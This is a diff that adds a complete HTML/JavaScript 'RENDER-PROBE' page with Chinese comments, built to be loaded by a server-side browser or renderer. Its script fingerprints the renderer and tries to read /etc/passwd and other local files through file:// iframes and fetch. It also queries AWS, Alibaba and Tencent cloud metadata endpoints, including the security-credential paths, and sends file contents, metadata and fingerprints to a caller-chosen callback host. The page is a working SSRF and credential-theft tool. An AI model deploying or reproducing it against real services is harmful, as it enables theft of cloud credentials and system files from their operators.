@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RENDER-PROBE</title>
+<meta property="og:title" content="RENDER-PROBE">
+<meta property="og:description" content="server-side render detection page">
+<meta property="og:image" content="./__probe/static.gif?p=og">
+<link rel="icon" href="./__probe/static.gif?p=icon">
+<link rel="preload" as="image" href="./__probe/static.gif?p=preload">
+<style>
+  html, body { margin: 0; padding: 0; background: #fff; color: #111; }
+  body { font-family: -apple-system, "Helvetica Neue", Arial, "PingFang SC", "Microsoft YaHei", sans-serif; padding: 18px 22px 40px; }
+  h1 { font-size: 26px; margin: 0 0 6px; }
+  h2 { font-size: 22px; margin: 26px 0 8px; padding-top: 10px; border-top: 2px solid #eee; }
+  .hint { color: #555; font-size: 16px; margin-bottom: 14px; }
+  .row { margin: 10px 0; }
+  .label { color: #666; font-size: 15px; }
+  .big { font-size: 30px; font-weight: 700; line-height: 1.35; word-break: break-all; }
+  .big2 { font-size: 22px; font-weight: 700; line-height: 1.4; word-break: break-all; }
+  .mono { font-family: Menlo, Consolas, "Courier New", monospace; }
+  .small { font-size: 15px; line-height: 1.5; word-break: break-all; }
+  .ok { color: #067a46; font-weight: 700; }
+  .warn { color: #b26a00; font-weight: 700; }
+  .bad { color: #b00020; font-weight: 700; }
+  .probe { margin: 8px 0 16px; padding: 8px; border: 1px solid #e5e5e5; border-radius: 4px; }
+  .probe iframe { display: block; width: 100%; max-width: 900px; height: 120px; border: 2px dashed #c33; background: #fff; }
+  table.meta { width: 100%; border-collapse: collapse; font-size: 15px; }
+  table.meta td { border: 1px solid #ddd; padding: 6px 8px; vertical-align: top; word-break: break-all; }
+  #done { margin-top: 22px; font-size: 26px; font-weight: 700; color: #067a46; }
+  .legend { margin-top: 10px; padding: 10px 12px; background: #f6f8fa; border-left: 4px solid #888; font-size: 15px; line-height: 1.6; }
+  @media print {
+    body { padding: 0; }
+    .hint, .legend, h2 { page-break-inside: avoid; }
+    .big { font-size: 22pt; }
+    .big2 { font-size: 15pt; }
+  }
+</style>
+</head>
+<body>
+<h1>RENDER-PROBE <span id="probe-id" class="mono small"></span></h1>
+<div class="hint">若你在截图/PDF 里看到本页，说明服务端用浏览器或 HTML 渲染器打开了它。下方大字为渲染容器的指纹。</div>
+<div id="js-ok" class="big">JS_NOT_EXECUTED（等待脚本）</div>
+
+<div class="row">
+  <div class="label">navigator.userAgent（大字回读）</div>
+  <div id="ua" class="big mono">(JS 未执行，无法读取)</div>
+</div>
+<div class="row">
+  <div class="label">内核与版本（粗判，以原始 UA / UA-CH 为准）</div>
+  <div id="ver" class="big2">-</div>
+</div>
+<div class="row">
+  <div class="label">UA-CH（Chromium 专有，含精确内核版本）</div>
+  <div id="ch" class="small mono">-</div>
+</div>
+<div class="row">
+  <div class="label">WebGL Renderer / 浏览器特征</div>
+  <div id="gl" class="small mono">-</div>
+  <div id="feat" class="small mono">-</div>
+</div>
+<div class="row">
+  <div class="label">JS 指纹外带（probe=js）</div>
+  <div id="cbout" class="small mono">-</div>
+</div>
+
+<h2>file:// 本地文件探测（截图里 iframe 出现内容 = 可读）</h2>
+<div id="files"></div>
+
+<h2>云元数据探测（回调里看最终 state）</h2>
+<div id="meta-warn" class="small warn"></div>
+<table class="meta"><tbody id="meta-rows"></tbody></table>
+
+<div id="done"></div>
+
+<div class="legend">
+  <b>判读：</b>回调收到 probe=js = 页面 JS 已执行；只看到本页与相对路径信标请求 = 仅 HTTP 抓取不跑 JS；
+  READABLE = 元数据响应可读（含 CORS），REACHABLE = 网络可达但被 CORS 挡住；BLOCKED = 不可达或被 PNA 拦截；
+  file:// iframe 内容可见 = 渲染器允许读本地文件。
+</div>
+
+<img src="./__probe/static.gif?p=html-img" width="1" height="1" alt="">
+<noscript><img src="./__probe/static.gif?p=noscript" width="1" height="1" alt=""></noscript>
+
+<script>
+(function () {
+  'use strict';
+
+  /* ---------- 参数 ---------- */
+  var q = {};
+  try {
+    var pairs = location.search.replace(/^\?/, '').split('&');
+    for (var i = 0; i < pairs.length; i++) {
+      if (!pairs[i]) { continue; }
+      var kv = pairs[i].split('=');
+      q[decodeURIComponent(kv[0])] = decodeURIComponent((kv[1] || '').replace(/\+/g, ' '));
+    }
+  } catch (e0) {}
+
+  var id = q.id || ('rp' + (new Date()).getTime().toString(36) + Math.random().toString(36).slice(2, 8));
+  var cb = q.cb || '';
+  if (cb && !/^https?:\/\//i.test(cb)) { cb = ''; }
+  var waitMs = parseInt(q.wait || '0', 10);
+  if (isNaN(waitMs) || waitMs < 0) { waitMs = 0; }
+  var doMeta = (q.meta !== '0');
+
+  function byId(elId) { return document.getElementById(elId); }
+  function setText(elId, s) {
+    var el = byId(elId);
+    if (el) { el.textContent = String(s); }
+  }
+  function trimStr(s) { return String(s).replace(/^\s+|\s+$/g, ''); }
+  function nowMs() { return (new Date()).getTime(); }
+
+  var probeIdEl = byId('probe-id');
+  if (probeIdEl) { probeIdEl.textContent = 'id=' + id; }
+  document.title = 'RENDER-PROBE';
+
+  /* ---------- 1. 指纹 ---------- */
+  var ua = navigator.userAgent || '';
+  setText('ua', ua);
+  setText('js-ok', 'JS_EXECUTED ✓');
+  var jsOkEl = byId('js-ok');
+  if (jsOkEl) { jsOkEl.className = 'big ok'; }
+
+  var feat = [];
+  feat.push('webdriver=' + (navigator.webdriver === true));
+  feat.push('plugins=' + (navigator.plugins ? navigator.plugins.length : '?'));
+  feat.push('vendor=' + (navigator.vendor || '?'));
+  feat.push('platform=' + (navigator.platform || '?'));
+  feat.push('lang=' + (navigator.language || '?'));
+  try {
+    feat.push('tz=' + (typeof Intl !== 'undefined' && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : '?'));
+  } catch (e1) {}
+  try {
+    feat.push('screen=' + screen.width + 'x' + screen.height + '@' + (window.devicePixelRatio || 1));
+  } catch (e2) {}
+  feat.push('cores=' + (navigator.hardwareConcurrency || '?'));
+  feat.push('mem=' + (navigator.deviceMemory || '?'));
+  feat.push('chrome=' + (typeof window.chrome !== 'undefined'));
+  feat.push('pdfViewer=' + (navigator.pdfViewerEnabled === true));
+  setText('feat', feat.join(' | '));
+
+  var glinfo = '-';
+  try {
+    var cv = document.createElement('canvas');
+    var gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+    if (gl) {
+      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if (dbg) {
+        glinfo = 'RENDERER=' + gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) + ' | VENDOR=' + gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+      } else {
+        glinfo = 'GL_VERSION=' + gl.getParameter(gl.VERSION);
+      }
+    } else {
+      glinfo = 'no-webgl';
+    }
+  } catch (e3) {
+    glinfo = 'webgl-err';
+  }
+  setText('gl', glinfo);
+
+  function guessEngine() {
+    var m;
+    if ((m = ua.match(/Edg\/([\d.]+)/))) { return 'Chromium (Edge) ' + m[1]; }
+    if ((m = ua.match(/HeadlessChrome\/([\d.]+)/))) { return 'Chromium Headless ' + m[1]; }
+    if ((m = ua.match(/Chrome\/([\d.]+)/))) { return 'Chromium ' + m[1]; }
+    if ((m = ua.match(/Firefox\/([\d.]+)/))) { return 'Gecko ' + m[1]; }
+    if ((m = ua.match(/AppleWebKit\/([\d.]+)/))) { return 'WebKit ' + m[1]; }
+    return '未知（以原始 UA / UA-CH 为准）';
+  }
+  var ver = guessEngine();
+  setText('ver', ver);
+
+  var uaCh = '-';
+  if (navigator.userAgentData) {
+    uaCh = 'platform=' + (navigator.userAgentData.platform || '?');
+    try {
+      var brands = navigator.userAgentData.brands || [];
+      for (var b = 0; b < brands.length; b++) {
+        uaCh += ' | ' + brands[b].brand + '/' + brands[b].version;
+      }
+    } catch (e4) {}
+    try {
+      if (navigator.userAgentData.getHighEntropyValues) {
+        navigator.userAgentData.getHighEntropyValues(['platformVersion', 'architecture', 'model', 'uaFullVersion', 'fullVersionList']).then(function (v) {
+          var parts = [];
+          if (v.uaFullVersion) { parts.push('uaFullVersion=' + v.uaFullVersion); }
+          if (v.platformVersion) { parts.push('platformVersion=' + v.platformVersion); }
+          if (v.architecture) { parts.push('arch=' + v.architecture); }
+          if (v.model) { parts.push('model=' + v.model); }
+          if (v.fullVersionList && v.fullVersionList.length) {
+            var fl = [];
+            for (var k = 0; k < v.fullVersionList.length; k++) {
+              fl.push(v.fullVersionList[k].brand + '/' + v.fullVersionList[k].version);
+            }
+            parts.push('full=' + fl.join(','));
+          }
+          if (parts.length) { setText('ch', parts.join(' | ')); }
+        }, function () {});
+      }
+    } catch (e5) {}
+  }
+  setText('ch', uaCh);
+
+  /* ---------- 2. 回调外带 ---------- */
+  function emit(probe, data) {
+    if (!cb) { return; }
+    var url = cb + (cb.indexOf('?') >= 0 ? '&' : '?') +
+      'probe=' + encodeURIComponent(probe) +
+      '&id=' + encodeURIComponent(id) +
+      '&ts=' + nowMs() +
+      (data ? '&' + data : '');
+    try {
+      if (window.fetch) {
+        window.fetch(url, { mode: 'no-cors', cache: 'no-store' })['catch'](function () {});
+      } else if (window.XMLHttpRequest) {
+        var x = new XMLHttpRequest();
+        x.open('GET', url, true);
+        x.send('');
+      }
+    } catch (e6) {}
+    try {
+      var im = new Image();
+      im.src = url;
+    } catch (e7) {}
+  }
+
+  var cbOut = byId('cbout');
+  if (cbOut) {
+    cbOut.textContent = cb ? ('已尝试外带 → ' + cb) : '未设置 cb（仅截图与相对信标；加 ?cb=https://你的回调 可外带）';
+  }
+
+  var fpData = 'ua=' + encodeURIComponent(ua) +
+    '&ver=' + encodeURIComponent(ver) +
+    '&gl=' + encodeURIComponent(glinfo).slice(0, 300) +
+    '&feat=' + encodeURIComponent(feat.join('|')).slice(0, 500);
+  setTimeout(function () { emit('js', fpData); }, 0);
+
+  /* ---------- 3. file:// 探测 ---------- */
+  var defaultFiles = 'file:///etc/passwd,file:///etc/hostname,file:///etc/hosts';
+  var fileList = (q.file === '0') ? [] : (q.file || defaultFiles).split(',');
+  var filesBox = byId('files');
+  for (var f = 0; f < fileList.length; f++) {
+    var furl = trimStr(fileList[f]);
+    if (!/^file:\/\//i.test(furl)) { continue; }
+    (function (u, idx) {
+      var box = document.createElement('div');
+      box.className = 'probe';
+      var lb = document.createElement('div');
+      lb.className = 'label';
+      lb.textContent = 'file-probe #' + idx + ' → ' + u + '（截图里出现内容即可读）';
+      box.appendChild(lb);
+      var fr = document.createElement('iframe');
+      fr.setAttribute('src', u);
+      box.appendChild(fr);
+      var note = document.createElement('div');
+      note.className = 'small';
+      note.textContent = 'fetch 尝试中…';
+      box.appendChild(note);
+      if (window.fetch) {
+        window.fetch(u, { cache: 'no-store' }).then(function (r) {
+          return r.text();
+        }).then(function (t) {
+          note.textContent = 'fetch 可读！前 200 字：' + t.slice(0, 200);
+          emit('file', 'url=' + encodeURIComponent(u) + '&state=readable&data=' + encodeURIComponent(t.slice(0, 500)));
+        })['catch'](function (err) {
+          note.textContent = 'fetch 被拒：' + (err && err.name ? err.name : err) + '（跨源限制；以 iframe 截图为准）';
+          emit('file', 'url=' + encodeURIComponent(u) + '&state=blocked');
+        });
+      } else {
+        note.textContent = 'fetch 不可用（旧内核），仅 iframe 截图';
+      }
+      filesBox.appendChild(box);
+    })(furl, f);
+  }
+
+  /* ---------- 4. 云元数据探测 ---------- */
+  var metaList = [
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    'http://100.100.100.200/latest/meta-data/',
+    'http://100.100.100.200/latest/meta-data/ram/security-credentials/',
+    'http://metadata.tencentyun.com/latest/meta-data/'
+  ];
+  var metaRows = byId('meta-rows');
+  var metaTotal = 0;
+  var metaDone = 0;
+
+  function finishAll() {
+    setTimeout(function () {
+      setText('done', 'PROBES_DONE');
+      emit('summary', '');
+    }, waitMs);
+  }
+
+  if (doMeta && location.protocol === 'https:') {
+    setText('meta-warn', '注意：本页通过 HTTPS 加载，http:// 元数据请求会被 Mixed Content 拦截；要探测元数据请用 HTTP 部署本页。');
+  }
+
+  if (!doMeta || !metaRows) {
+    if (metaRows) {
+      var tr0 = document.createElement('tr');
+      var td0 = document.createElement('td');
+      td0.colSpan = 2;
+      td0.textContent = '已关闭元数据探测（?meta=0）';
+      tr0.appendChild(td0);
+      metaRows.appendChild(tr0);
+    }
+    finishAll();
+  } else {
+    for (var mIdx = 0; mIdx < metaList.length; mIdx++) {
+      metaTotal++;
+      (function (murl) {
+        var tr = document.createElement('tr');
+        var tdUrl = document.createElement('td');
+        tdUrl.className = 'mono';
+        tdUrl.textContent = murl;
+        var tdSt = document.createElement('td');
+        tdSt.textContent = '探测中…';
+        tr.appendChild(tdUrl);
+        tr.appendChild(tdSt);
+        metaRows.appendChild(tr);
+
+        var t0 = nowMs();
+        var elapsed = 0;
+        function mark() { elapsed = nowMs() - t0; }
+        function done(state, extra) {
+          tdSt.textContent = state + ' (' + elapsed + 'ms)' + (extra ? ' ' + extra : '');
+          tdSt.className = state.indexOf('READABLE') === 0 ? 'ok' : (state.indexOf('REACHABLE') === 0 ? 'warn' : 'bad');
+          emit('meta', 'url=' + encodeURIComponent(murl) + '&state=' + encodeURIComponent(state) + '&ms=' + elapsed + (extra ? '&extra=' + encodeURIComponent(extra).slice(0, 800) : ''));
+          metaDone++;
+          if (metaDone === metaTotal) { finishAll(); }
+        }
+
+        if (!window.fetch) {
+          mark();
+          done('NO_FETCH');
+          return;
+        }
+        /* ① 先按 CORS 读内容（服务端放开 CORS 时可直接拿到元数据/凭据） */
+        var ctrl = window.AbortController ? new AbortController() : null;
+        var timer = setTimeout(function () { if (ctrl) { ctrl.abort(); } }, 2500);
+        window.fetch(murl, { mode: 'cors', cache: 'no-store', signal: ctrl ? ctrl.signal : undefined }).then(function (r) {
+          return r.text().then(function (t) {
+            clearTimeout(timer);
+            mark();
+            done((r.ok ? 'READABLE' : 'READABLE_HTTP' + r.status), 'content=' + t.replace(/\s+/g, ' ').slice(0, 240));
+          });
+        })['catch'](function () {
+          clearTimeout(timer);
+          /* ② CORS 不通再用 no-cors 测网络可达 */
+          var ctrl2 = window.AbortController ? new AbortController() : null;
+          var timer2 = setTimeout(function () { if (ctrl2) { ctrl2.abort(); } }, 2500);
+          window.fetch(murl, { mode: 'no-cors', cache: 'no-store', signal: ctrl2 ? ctrl2.signal : undefined }).then(function () {
+            clearTimeout(timer2);
+            mark();
+            done('REACHABLE(no-cors)');
+          })['catch'](function () {
+            clearTimeout(timer2);
+            mark();
+            done('BLOCKED/UNREACHABLE');
+          });
+        });
+      })(metaList[mIdx]);
+    }
+  }
+})();
+</script>
+</body>
+</html>
